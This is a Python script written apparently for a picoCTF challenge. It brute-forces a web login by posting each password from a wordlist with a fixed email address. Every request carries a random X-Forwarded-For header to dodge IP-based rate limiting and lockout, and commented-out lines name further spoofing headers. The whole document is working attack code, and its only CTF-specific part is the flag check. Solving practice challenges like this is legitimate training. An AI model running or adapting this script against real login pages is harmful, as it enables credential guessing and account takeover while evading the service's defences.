import requests
import random
import time

url = "http://amiable-citadel.picoctf.net:59903/"
email = "ctf-player@picoctf.org"

def random_ip():
    """Generate a random IP address"""
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def check_success(response):
    """Check if login was successful based on response"""
    response_text = response.text.lower()
    
    # Check for flag or success indicators in response
    if "flag{" in response_text or "picoctf{" in response_text:
        return True
    
    return False

# Read all passwords from file
with open("passwords.txt", "r") as f:
    passwords = [line.strip() for line in f.readlines() if line.strip()]

print(f"[*] Total passwords to try: {len(passwords)}")
print(f"[*] Target URL: {url}")
print(f"[*] Email: {email}")
print("-" * 80)

found = False
for idx, passwd in enumerate(passwords, 1):
    if found:
        break
    
    ip = random_ip()
    
    headers = {
        "X-Forwarded-For": ip,
        #"X-Real-IP": ip,
        #"CF-Connecting-IP": ip,
        #"True-Client-IP": ip,
        #"Client-IP": ip,
        "Content-Type": "application/json",
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0"
    }
    
    data = {
        "email": email,
        "password": passwd
    }
    
    try:
        response = requests.post(url, json=data, headers=headers, timeout=10)
        
        is_success = check_success(response)
        status_indicator = "✓ SUCCESS" if is_success else "✗ Failed"
        
        print(f"[{idx:3d}] {status_indicator} | IP: {ip:15s} | Pass: {passwd:15s} | Status: {response.status_code}")
        
        if is_success:
            print("-" * 80)
            print("[+] PASSWORD FOUND!")
            print(f"[+] Correct Password: {passwd}")
            print(f"[+] Response:\n{response.text}")
            found = True
        
        time.sleep(0.5)  # small delay to avoid overwhelming the server
        
    except requests.exceptions.RequestException as e:
        print(f"[{idx:3d}] ✗ Error   | IP: {ip:15s} | Pass: {passwd:15s} | Error: {str(e)}")
        time.sleep(0.5)

if not found:
    print("-" * 80)
    print("[-] No correct password found in list")